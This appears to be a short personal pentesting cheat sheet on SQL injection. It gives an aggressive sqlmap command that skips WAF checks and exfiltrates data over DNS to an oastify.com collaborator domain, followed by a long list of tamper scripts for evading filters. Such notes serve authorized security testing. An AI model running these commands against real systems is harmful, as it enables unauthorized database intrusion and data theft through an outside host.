# SQLI

Make sure SQLMAP DNS Collaborator extension is still installed (testing)

* Cryptocat recommends to avoid using `-r`option and to just use CLI

```bash
sudo sqlmap --skip-waf --risk 3 --level 3 -r request.item -o --batch --dns-domain=laz3k1ymu2kc0idl9tumx345nwtnhf54.oastify.com
```

Tamper scripts general (Jhaddix)

```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
